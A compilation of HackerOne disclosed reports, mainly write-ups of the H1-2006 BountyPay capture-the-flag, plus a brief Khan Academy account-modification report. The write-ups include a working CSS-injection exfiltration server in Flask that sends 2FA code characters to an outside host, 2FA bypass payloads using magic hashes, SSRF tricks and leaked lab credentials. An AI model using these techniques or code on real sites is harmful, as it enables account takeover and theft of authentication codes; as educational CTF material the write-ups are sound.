GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ= HTTP/1.1
Host: staff.bountypay.h1ctf.com
X-Requested-With: XMLHttpRequest
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09
```
```http
HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHOWlLbi9xY0pkUFIxdnFpV1B4V3JmY3JhT3ZqQ1ZFVlpnYzMzaFAxMllyUzE3UT09; expires=Mon, 06-Jul-2020 23:09:22 GMT; Max-Age=2592000; path=/

["Report received"]
```

And we were given a new session cookie! Logging in with that new cookie, we see that we indeed have extra privileges now. Namely, there is a new tab named `Admin`, showing plain text credentials for Mårten's customer account!
{F863165}

One last thing that wasn't clear to me is what `/?template=admin` was for. I visited it, and it just returned `view admin` string... Must have just been added to divert attention.

## Payment 2FA Bypass / CSS Exfiltration

Back to customer portal at `app.bountypay.h1ctf.com` we login with Mårten's credentials. We use the same `challenge` and `challenge_answer` as before to bypass login 2FA:

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded

username=marten.mickos&password=h%26H5wy2Lggj*kKn4OD%26Ype&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
```
```http
HTTP/1.1 302 Found
Set-Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9; expires=Mon, 06-Jul-2020 23:56:57 GMT; Max-Age=2592000
Location: /
```

Recall the original CTF tweet, and that we need to help Mårten approve May bug bounty payments. We thus fetch transactions for May 2020 and we indeed get a valid response this time:
{F863225}

When we click Pay, however, we're presented with another 2FA challenge:
{F863226}

Ok. let's intercept the next request (when we click on "Send Challenge" button) and see what it looks like:

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```
And the relevant HTML snippet from the response:
```html
<h1 class="text-center">BountyPay</h1>
<h3 class="text-center">2FA Payment Challenge</h3>
<form method="post">
	<input type="hidden" name="challenge_timeout" value="1591490942">
	<input type="hidden" name="challenge" value="2cf37bd3c17d4621658828b374579adb">
	<div class="panel panel-default" style="margin-top:50px">
		<div class="panel-heading">Payment Challenge Sent</div>
		<div class="panel-body text-center">
			<p>We have sent the payment challenge to your 2FA, you have 2 minutes to enter the code, please enter it below</p>
			<div><input name="challenge_answer" class="form-control" maxlength="7"></div>
		</div>
	</div>
	<input type="submit" class="btn btn-success pull-right" value="Send Answer">
</form>
```
Issuing the request a few more times I confirmed that we're presented with a new `challenge`value every time, and our goal is to get the right `challenge_answer` for it, which shouldn't be longer than 7 characters (`maxlength="7"`).The only unusual thing about this is that the POST request contains `app_style` parameter which references a stylesheet from `https://www.bountypay.h1ctf.com/css/uni_2fa_style.css`.

This seems a lot like we're going to need to exfiltrate `challenge_answer`with CSS, but let's confirm step by step.

Firstly, I've made a request using Burp Collaborator payload to confirm we can fetch a stylesheet from an arbitrary external resource:

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https://u1w9neu3o71nmwn6ryh9o7zbg2msah.burpcollaborator.net/css/uni_2fa_style.css
```
And I got a hit straight away:
{F863231}

A few things are worth noting when inspecting the request received by Collaborator:
1. `User-Agent` tells us that request was made from Headless Chrome. 
2. [`Sec-Fetch-Dest: style`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Dest) tells us that the resource would be embedded as a stylesheet (using `<link ... rel="stylesheet">`)

Given that we only have a single injection point, I assumed the task would be to exfiltrate `challenge_answer ` characters recursively. I was well aware of the relatively-recent technique for sequential exfiltration using `@import` directives, which you can read about in a brilliant blog post titled [Better Exfiltration via HTML Injection](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) by [@d0nutptr](https://twitter.com/d0nutptr). Worth mentioning that a similar technique was [first discovered](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) half a year before by [Vila](https://twitter.com/cgvwzq). Note that this technique works in Chrome because Chrome processes `@import` directives asynchronously (executing the rest of CSS code while additional resources load). This, for instance, is not the case for Firefox that executes them sequentially, as was demonstrated by [Michał Bentkowski](https://twitter.com/securitymb) in another excellent blog post on this subject, titled [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/).

So the fact that page was loaded in Headless Chrome reaffirmed my intuition that we're after sequential exfiltration using `@import` directives. d0nutptr actually wrote a [sic](https://github.com/d0nutptr/sic) tool available on GitHub that could be used to execute such an attack, but I wanted to try this for myself so I wrote the necessary exploit in Python..... only to realise that it's not actually possible. As I have realized, Chrome only loads `@import` resources asynchronously when they appear within `<style>` elements in HTML. When they appear in the external stylesheets using `<link>` tag, however, Chrome stops CSS evaluation until the resource is loaded. It means that in our case sequential exfiltration isn't actually possible.

For a moment I even doubted whether this is about CSS exfiltration, so I even checked whether we could get XSS by injecting quotes into `app_style`to escape the attribute value... but it was secure.

So we're back to the CSS exfiltration. Ok, since the sequential technique won't work, let's just try to at least get the first character, for a start. To get that, all we need is a same-old trick of a selector matching a certain input name/value. First I tried adding this to my stylesheet:

```css
input[name=challenge_answer]{
    background-image: url(https://attacker.com/);
}
```
and didn't get any hit. Ok, the input name must be different then - let's widen that by just matching on a single character:
```css
input[name^=c]{
    background-image: url(https://attacker.com/);
}
```
That gives a hit, so we're on the right track. But if the name is not `challenge_answer` but starts with `c`, what could that be? Re-reading the message again I realised that the name is likely to be `code`:  `We have sent the payment challenge to your 2FA, you have 2 minutes to enter the code, please enter it below`.

When I tried an exact match on `code`, I didn't get any hit though:
```css
input[name=code]{
    background-image: url(https://attacker.com/);
}
```
So the name must be starting with the code then. At  this point I added a match on the first character of the value to see if I get anything back, and to my surprise I got 7 hits!
```css
input[name^=code][value^=a]{
    background-image: url(https://attacker.com/exfil/a);
}
input[name^=code][value^=b]{
    background-image: url(https://attacker.com/exfil/b);
}
...
```
(I've used all ASCII letters, both uppercase and lowercase, and digits).

This is when it struck me that there are, in fact, 7 separate inputs on the page, each containing a single character. This made perfect sense, as to exfiltrate such code we don't need any sequential imports - we just need many selectors.

But before we get there, we need to know exact names of inputs - because we need to know the exact order of characters. If we simply match on `input[name^=code]` we'd never know which character is at which place.

So I quickly made another few iterations on progressively matching the next character to determine the input names and they turned out to be `code_1`, `code_2`, ..., `code_7`. From there it was all really trivial.

Let's see what my final code looks like, and then we can break it down piece by piece:

I'm using Flask here. Since it needs to be available on public internet and with a valid HTTPS certificate, I'm not focusing on how this could be ran / deployed. Rather, this shows Flask routes with all the relevant logic of the exploit.
```python
import logging
import string
from collections import defaultdict
from typing import List
from uuid import uuid4

from flask import url_for, Response, current_app, request

from . import blueprint

logger = logging.getLogger(__name__)

NUM_CHARS = 7

ALLOWED_CHARS = string.digits + string.ascii_letters + string.punctuation

# Store exfiltrated results in a dict where keys are sessions and values are 7-element lists
code_chars = defaultdict(lambda: [None] * NUM_CHARS)

original_css = """
/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}
"""


@blueprint.route('/uni_2fa_style.css')
def uni_2fa_style_css():
    session = request.args.get('session', uuid4().hex[:5])

    def selector(pos, char):
        name = escape_css_selector(f'code_{pos + 1}')
        value = escape_css_selector(char)
        callback = url_for(".h1_2006_callback", session=session, pos=pos, char=char, _external=True, _scheme='https')
        return f'input[name="{name}"][value="{value}"]{{background-image: url({callback});}}'

    selectors = [selector(pos, char) for pos in range(NUM_CHARS) for char in ALLOWED_CHARS]

    css = '\n'.join(selectors + [original_css])

    return Response(css, mimetype='text/css')


@blueprint.route('/h1-2006-callback/<session>/<int:pos>/<char>')
def h1_2006_callback(session: str, pos: int, char: str):
    global code_chars

    chars: List = code_chars[session]
    chars[pos] = char

    if None not in chars:
        code = ''.join(chars)
        logger.info(f"[session {session}] Exfiltrated code: {code}")

    return '', 204  # 204 No Content, i.e. just empty response


def escape_css_selector(selector: str) -> str:
    return selector \
        .replace("\\", "\\\\") \
        .replace("!", "\\!") \
        .replace("\"", "\\\"") \
        .replace("#", "\\#") \
        .replace("$", "\\$") \
        .replace("%", "\\%") \
        .replace("&", "\\&") \
        .replace("'", "\\'") \
        .replace("(", "\\(") \
        .replace(")", "\\)") \
        .replace("*", "\\*") \
        .replace("+", "\\+") \
        .replace(",", "\\,") \
        .replace("-", "\\-") \
        .replace(".", "\\.") \
        .replace("/", "\\/") \
        .replace(":", "\\:") \
        .replace(";", "\\;") \
        .replace("<", "\\<") \
        .replace("=", "\\=") \
        .replace(">", "\\>") \
        .replace("?", "\\?") \
        .replace("@", "\\@") \
        .replace("[", "\\[") \
        .replace("]", "\\]") \
        .replace("^", "\\^") \
        .replace("`", "\\`") \
        .replace("{", "\\{") \
        .replace("|", "\\|") \
        .replace("}", "\\}") \
        .replace("~", "\\~")

```
Let's break it down.

Firstly, we build a stylesheet by adding a selector for every code input field, and for every possible character. You would notice that I also use a `session` within my callbacks - this is to ensure that responses from overlapping attempts won't ever get mixed up.
```python
@blueprint.route('/uni_2fa_style.css')
def uni_2fa_style_css():
    session = request.args.get('session', uuid4().hex[:5])

    def selector(pos, char):
        name = escape_css_selector(f'code_{pos + 1}')
        value = escape_css_selector(char)
        callback = url_for(".h1_2006_callback", session=session, pos=pos, char=char, _external=True, _scheme='https')
        return f'input[name="{name}"][value="{value}"]{{background-image: url({callback});}}'

    selectors = [selector(pos, char) for pos in range(NUM_CHARS) for char in ALLOWED_CHARS]

    css = '\n'.join(selectors + [original_css])

    return Response(css, mimetype='text/css')
```
You can see the resulting CSS generated by this code e.g. [here](https://py.whitehat-hacker.com/poc/ctf/uni_2fa_style.css):
```css
input[name="code_1"][value="0"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/0);}
input[name="code_1"][value="1"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/1);}
input[name="code_1"][value="2"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/2);}
input[name="code_1"][value="3"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/3);}
input[name="code_1"][value="4"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/4);}
...
```

What's worth noting is that certain characters have to be escaped within CSS selectors - this is what my `escape_css_selector` function is for. To build a proper escaping function that would cover all cases is actually no easy task. If you're into that sort of stuff, I highly recommend [CSS character escape sequences](https://mathiasbynens.be/notes/css-escapes) blog post by [Mathias Bynens](https://twitter.com/mathias), who has also made an [online tool] (https://mothereff.in/css-escapes) to do such escaping, with [source code [javascript]](https://github.com/mathiasbynens/mothereff.in/tree/master/css-escapes) available on GitHub. In our case we don't need to handle all these edge cases though, and in fact I've bluntly copy-pasted the escaping part from d0nutptr's [sic](https://github.com/d0nutptr/sic/blob/master/src/main.rs#L298-L330) tool.

We're using a dict of lists (keyed by session) to store the characters we receive at the right places in the list:
```python
# Store exfiltrated results in a dict where keys are sessions and values are 7-element lists
code_chars = defaultdict(lambda: [None] * NUM_CHARS)
```

And lastly, the route for the callback - we just keep collecting the characters, and when we have all 7 for this session, we join them up and log the code:

```python
@blueprint.route('/h1-2006-callback/<session>/<int:pos>/<char>')
def h1_2006_callback(session: str, pos: int, char: str):
    global code_chars

    chars: List = code_chars[session]
    chars[pos] = char

    if None not in chars:
        code = ''.join(chars)
        logger.info(f"[session {session}] Exfiltrated code: {code}")

    return '', 204  # 204 No Content, i.e. just empty response
```

A sample output of running such code (and passing our stylesheet to the 2FA challenge) is like this:
```
[Thread-10 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] "GET /poc/ctf/uni_2fa_style.css HTTP/1.0" 200 -
[Thread-11 |pid:17455]INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] "GET /poc/ctf/h1-2006-callback/0cc2d/0/b HTTP/1.0" 204 -
[Thread-12 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] "GET /poc/ctf/h1-2006-callback/0cc2d/1/N HTTP/1.0" 204 -
[Thread-13 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] "GET /poc/ctf/h1-2006-callback/0cc2d/2/f HTTP/1.0" 204 -
[Thread-14 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] "GET /poc/ctf/h1-2006-callback/0cc2d/3/Q HTTP/1.0" 204 -
[Thread-15 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] "GET /poc/ctf/h1-2006-callback/0cc2d/4/h HTTP/1.0" 204 -
[Thread-16 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] "GET /poc/ctf/h1-2006-callback/0cc2d/5/D HTTP/1.0" 204 -
[Thread-17 |pid:17455] INFO: [session 0cc2d] Exfiltrated code: bNfQhDT
[Thread-17 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] "GET /poc/ctf/h1-2006-callback/0cc2d/6/T HTTP/1.0" 204 -
```

Once we obtain the code, we simply submit it as a response for 2FA challenge using the corresponding input on the page, and we're finally presented with the flag!
{F863338}

If you've read this far, thank you very much for bearing with me!

--------------------------------------------
References

Tools
* [Amass](https://github.com/OWASP/Amass)
* [Massdns](https://github.com/blechschmidt/massdns) 
  * [commonspeak2](https://github.com/assetnote/commonspeak2-wordlists/blob/master/subdomains/subdomains.txt)
  * [dnsgen](https://github.com/ProjectAnte/dnsgen)
* [ffuf](https://github.com/ffuf/ffuf)
* [gitdumper.sh](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh)
* [dex2jar](https://github.com/pxb1988/dex2jar)
* [JD-GUI](http://java-decompiler.github.io/)
* [sic](https://github.com/d0nutptr/sic) 
* [CSS escapes](https://github.com/mathiasbynens/mothereff.in/tree/master/css-escapes) with [online tool] (https://mothereff.in/css-escapes)

Techniques / Blog posts
* [Subdomain Enumeration: 2019 Workflow](https://0xpatrik.com/subdomain-enumeration-2019/) by [Patrik Hudak](https://twitter.com/0xpatrik) 
* [Better Exfiltration via HTML Injection](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) by [@d0nutptr](https://twitter.com/d0nutptr)
* [CSS Injection Attacks](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) by  [Pepe Vila](https://twitter.com/cgvwzq)
* [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/) by [Michał Bentkowski](https://twitter.com/securitymb)
* [CSS character escape sequences](https://mathiasbynens.be/notes/css-escapes) by [Mathias Bynens](https://twitter.com/mathias)

## Impact

-

---

### [Unauthorised Account Detail Modification ](https://hackerone.com/reports/868146)

- **Report ID:** `868146`
- **Severity:** High
- **Weakness:** Improper Access Control - Generic
- **Program:** Khan Academy
- **Reporter:** @5kyw41k3r
- **Bounty:** - usd
- **Disclosed:** 2020-06-19T15:37:21.424Z
- **CVE(s):** -

**Vulnerability Information:**

Introduction
=========
Hi `5kyw41k3r` here,

==I found an Unauthorised Account Detail Modification  in KA website==...

Defination
=========
```
It is a flaw which allows a malicious actor to modify the details of an account. I have included a video made by me for demonstration purposes using a test account...
```
Reproduction Steps:-
============== 
==I have included a video in the attachments==
+ You need burp proxy correctly configured and working properly.
+ Go to settings and make minor changes to your account.
+ Hit save and then intercept that request.
+ Disconnect your browser and your proxy
+ Send the Step 3 request to the repeater and forward all unnecessary requests.
+ Modify the request as shown in the video
There you have it! ==Notice how you can change you nickname and DOB which is actually not authorized in the browser itself.==   

Here's the vid=====> ████████

## Impact

Impact
======

Well, khan academy being used in schools like mine as it says on the page;
>This is because Khan Academy is used in many schools...

Anyone can change these details by getting hold of those requests, which you can do through the inspect element...No rocket science!

This can lead to a lot of issues such as leakage of sensitive data(==Such as parent emails and accounts==)

They could also perform identity theft through this method.

 I strongly recommend to fix this as soon as possible. 
Hoping for swag!

Thanks and Stay Safe at Home,
`5kyw41k3r`

---

### [[H1-2006 2020] In-depth resolution of the h1-2006 CTF](https://hackerone.com/reports/894174)

- **Report ID:** `894174`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** h1-ctf
- **Reporter:** @enzyro
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T16:10:49.084Z
- **CVE(s):** -

**Vulnerability Information:**

# H1-2006 Write-up bountypay.h1ctf.com

First of all, huge thanks to the creators for this CTF, it was really fun and got me to improve a lot !
It was my first h1 ctf, and it for sure won't be my last ! 

For this report, I'll try to define for each step :
* an abstract of what was the bug
* the real life impact it would have had
* a potential fix
* an in-depth explanation of what I was thinking, what I tried, and what worked

Thank you to any reviewer for his/her time on this.

The final flag is :
`^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`

# Step 1 - It all starts with recon

## Abstract
Able to access to a git repository that leads an attacker to a log file that is served on the web server containing credentials.

## Impact
Login as an authorized user on `app.bountypay.h1ctf.com`.

## Potential fix
Make the .git folder unaccessible on the server & make sure log files are not accessible as well.

## In-depth explanation
We are given a wildcard domain `*.bountypay.h1ctf.com`, so let's get to it !
I started by using subfinder and https://crt.sh, this is usually enough to get most domains.
The domains I found are as follows :

```
api.bountypay.h1ctf.com
app.bountypay.h1ctf.com
bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
```
I found it interesting to have a ctf on a wildcard domain, as I wasn't really sure those five domains were all there was, so I kept in my notes to check for other domains if I get really stuck.

I started my nmap scan on those subdomains, using the `-sCV` argument to run the defaults scripts & version detection.
While my scan was running, I did a quick check on the [wayback machine](https://archive.org/web/) to make sure those domains were never snapshoted as it might have revealed some clues.

I got a hit for port 80, 443 and 22 on every domain, like I expected, so I started running gobuster with my go-to [wordlist](https://github.com/v0re/dirb/blob/master/wordlists/common.txt) on every domain.
I first tried to use the `redirect` endpoint on the `api.bountypay.h1ctf.com` to try and get an SSRF, without any success, so I thought that would be useful later.

The nmap script scan showed a potential git repository on the `app.bountypay.h1ctf.com` subdomain :
```
| http-git:
|   3.21.98.146:443/.git/
|     Potential Git repository found (found 3/6 expected files)
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/bounty-pay-code/request-logger.git
```
That was later confirmed by a hit on `/.git/HEAD` by gobuster.

I started reading the code on the [remote github repository](https://github.com/bounty-pay-code/request-logger.git), and quickly found about the `bp_web_trace.log` file that was logging incoming requests.
To make sure I wasn't missing anything, I used the great [gitTools](https://github.com/internetwache/GitTools) dumper script to dump all the .git repository. There was nothing more that was interesting in it.

# Step 2 - Knocking on login's door

## Abstract
When an attacker tries to login with a working password & username, he can bypass the 2FA due to a weak typed comparison/type juggling attack

## Impact
Access to a user's account without having to validate the 2FA

## Potential fix
Make sure every user input is strongly typed specially when using a language that doesn't force you to strongly type your variables (python, php, javascript ...).

## In-depth explanation
In the `bp_web_trace.log` file, I found some b64 encoded strings containing access logs to the website :
```
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

I instantly tried the credentials contained in the 2nd line on the login page `username=brian.oliver&password=V7h0inzX` aaaaand we're IN ...

{F859887} 

... But there is a 2FA to bypass.

I first tried to use the same `challenge_answer=bD83Jk27dQ` from the 3rd line of the log file, without success. After that I quickly found that the challenge was send along with the challenge_answer like this

{F859891} 

So the challenge is a md5 and the answer a short alphanumeric string.

I instantly thought about magic hashes (or type juggling)
got the first one from this [file](https://github.com/spaze/hashes/blob/master/md5.md) and tried it aaaaand it worked ! (I was really proud to think about it this fast and to get it on the first try !).

So here's the payload that allowed me to bypass the 2FA :
`username=brian.oliver&password=V7h0inzX&challenge=0e462097431906509019562988736854&challenge_answer=240610708`

And we're now logged in !

# Step 3 - To ken or not token

## Abstract
The authentication token is used in the application flow resulting in a LFI and a SSRF because this input is not sanitized.

## Impact
Access to IP restricted areas due to an unsanitized user input.

## Potential fix
Every user accessible input needs to be sanitized before being used in an application, even if it isn't something a typical user would try to change.

## In-depth explanation
When logged in, we get a token :
`eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` which once decoded from base64 gives us `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`.

When we look back at the decoded logs, we see that the user was requesting the `/statements` endpoint, and when we try to request it we get :

{F859886} 

In the response we see the url being requested by the app on the api :
`https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020`

We now know that the account requested is the value we have inside the token, so let's try to play with it a bit :
The first problem was that I needed to ignore the last part of the request : `/statements?month=01&year=2020` because even if we had a properly working SSRF or LFI, the *statements* part would be a problem.
After trying some things that didn't work, I thought about the HTML anchors that are defined by a #.
so I tried adding `/#` to my account_id and sending it :
`{"account_id":"F8gHiqSdpK/#","hash":"de235bffd23df6995ad4e0930baac1a2"}`

and got a response that contained some more information : 

{F859885} 

By then, I was pretty sure I had to play with that account id to get either a LFI or a SSRF. At that time I thought about the `redirect` endpoint I had seen earlier during my initial recon, and started to try accessing the `software.bountypay.h1ctf.com` domain that wasn't accessible due to an IP check.

after some tries, I managed to access to the software domain using this payload :

`{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}`

{F859884}

And so there was another login page in there.
since we could not send post data using this SSRF, I was pretty sure we didn't have to login, but to scan the website from here to get more juicy data.

I wrote a quick & dirty python script to do that for me using the same wordlist as earlier.

My script quickly found that `/uploads` was available, so I requested it :

{F859883} 

And there we get the information that there is an Apk file available in the directory !!

`https://software.bountypay.h1ctf.com/uploads/BountyPay.apk`

Requested it through a web browser, and let's get to the next step !

# Step 4 - It's Android time

## Abstract
There isn't any real "bug" on this step (except for the insecure logging on the 3rd part), mostly just understanding how to reverse engineer an android application.

## In-depth explanation
So we get our apk, fortunately, I'm used to testing android apps in bug bounties programs, so this shouldn't be too hard.
As always when testing an apk I would decompile the java code back into files using [jadx](https://github.com/skylot/jadx), and launch the apk on a rooted emulator, running with a burp certificate at system level to allow me to inspect web requests.

while looking at the `AndroidManifest.xml` it appears we have to complete 3 steps, defined by 3 activities :
* PartOneActivity.java
* PartTwoActivity.java
* PartThreeActivity.java

And also that there is one way to launch every activity using a custom deeplink for each :

{F859881} 

So the parts should be started by a deeplink starting by :
* one://part
* two://part
* three://part

## Part 1

First let's take a look at the activity :

{F859880} 

Not much to see here.

Looking at the decompiled code of the PartOne OnCreate : 
```java
if (getIntent() != null && getIntent().getData() != null) {
            String firstParam = getIntent().getData().getQueryParameter("start");
            if (firstParam != null && firstParam.equals("PartTwoActivity") && settings.contains(user))
```

We see that this activity should be launched with a queryparameter `start` that should be equal to `PartTwoActivity` so let's try this using adb :
`adb shell am start -n bounty.pay/.PartOneActivity -d one://part?start=PartTwoActivity`

{F859877} 

And we're straight to the Part2 !

## Part 2

So, nothing much either on the screen on the activity, so let's take a look at the decompiled onCreate :

```java
if (getIntent() != null && getIntent().getData() != null) {
    Uri data = getIntent().getData();
    String firstParam = data.getQueryParameter("two");
    String secondParam = data.getQueryParameter("switch");
    if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on")) {
        editText.setVisibility(0);
        button.setVisibility(0);
        textview.setVisibility(0);
    }
```

So this is very much like the first activity, but this time we have to set to parameters :
* two=light
* switch=on
in order to make some buttons visible.

let's use adb again to start it :
`adb shell am start -n bounty.pay/.PartTwoActivity -d "two://part?two=light\&switch=on"`

Note that you should really not forget the `\` before the `&` to avoid it being interpreted by bash.

now we get some things printed on the screen :

{F859877}

so we have a md5 string `459a6f79ad9b13cbcb5f692d2cc7a94d` and a submit, the first thing I tried is to check if the md5 is in the [crackstation](https://crackstation.net/) database.

{F859876} 

so the md5 value is `Token`, I tried inputting it into the field, but it didn't work, so I went back to the code and saw :

```java
StringBuilder stringBuilder = new StringBuilder();
stringBuilder.append("X-");
stringBuilder.append(value);
```
Oh, so that value should be `X-Token` !
And we're through this part2 !

## Part 3

Same as the first two activities, we don't have much on the screen :

{F859877} 

```java
if (getIntent() != null && getIntent().getData() != null) {
    Uri data = getIntent().getData();
    String firstParam = data.getQueryParameter("three");
    String secondParam = data.getQueryParameter("switch");
    String thirdParam = data.getQueryParameter("header");
    byte[] decodeFirstParam = Base64.decode(firstParam, 0);
    byte[] decodeSecondParam = Base64.decode(secondParam, 0);
    final String decodedFirstParam = new String(decodeFirstParam, StandardCharsets.UTF_8);
    final String decodedSecondParam = new String(decodeSecondParam, StandardCharsets.UTF_8);
    AnonymousClass5 anonymousClass5 = r0;
    DatabaseReference databaseReference = this.childRefThree;
    final String str = firstParam; //b64(get(three))
    final String str2 = secondParam; //b64(get(switch))
    secondParam = thirdParam; //get(header)
    final EditText editText2 = editText;
    final Button button2 = button;
    AnonymousClass5 anonymousClass52 = new ValueEventListener() {
        public void onDataChange(DataSnapshot dataSnapshot) {
            String value = (String) dataSnapshot.getValue();
            if (str != null && decodedFirstParam.equals("PartThreeActivity") && str2 != null && decodedSecondParam.equals("on")) {
                String str = secondParam; //get(header)
                if (str != null) {
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append("X-");
                    stringBuilder.append(value);
                    if (str.equals(stringBuilder.toString())) {
                        editText2.setVisibility(0);
                        button2.setVisibility(0);
                        PartThreeActivity.this.thread.start();
                    }
                }
            }
        }
```

After breaking down what does this part mean, we have to send a deeplink again with :
* three=b64(PartThreeActivity)
* switch=b64(on)
* header=X-Token

I had the right idea in the beginning but the b64 I was using included a newline so it took me a few hours to figure out what I was doing wrong, here is the final adb payload :
`adb shell am start -n bounty.pay/.PartThreeActivity -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk=\&switch=b24=\&header=X-Token"`

And we now get our button that talks about a "leaked hash" :

{F859874} 

Where could we get that leaked hash ?

```java
public String performPostCall(String paramValue) {
    SharedPreferences settings = getSharedPreferences(KEY_USERNAME, 0);
    String token = "";
    String host = settings.getString("HOST", token);
    token = settings.getString("TOKEN", token);
    Log.d("HOST IS: ", host);
    Log.d("TOKEN IS: ", token);
    ...
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("X-Token: ");
    stringBuilder.append(paramValue);
    Log.d("HEADER VALUE AND HASH ", stringBuilder.toString());

```
We could see that leaked hash in 3 different places :
* In the settings file, that is located on the android in `/data/data/bounty.pay/shared_prefs/user_created.xml` (the device needs to be rooted in order to access this file).
* We can also see it in logcat by using `adb logcat TOKEN:V` while sending the previous `am start` command.
* We can see it in Burp proxy if the emulator has the Burp certificate installed, because it is send in a request.

So this famous `leaked hash` is equal to `8e9998ee3137ca9ade8f372739f062c1`.

After inputting this hash in the text field, we get this screen :

{F859872} 

Woohoo, we're through !

and according to the `CongratsActivity` code :
```java
Snackbar.make(view, (CharSequence) "Information leaked here will help with other challenges.", 0).setAction((CharSequence) "Action", null).show();
```
This information will help us later !

# Step 5 - Good to know, but what the **** am I supposed to do with it ?

## Abstract
Using a previously leaked token and some OSINT, an attacker is able to login into a restricted area.

## Impact
Unauthorized access to restricted area

## Potential fix
Making sure you don't leak any token, and properly training employees about what they post on social media and how it could result in an attack. 

## In-depth explanation
This part was probably my biggest time loss in comparison to what I was supposed to do.

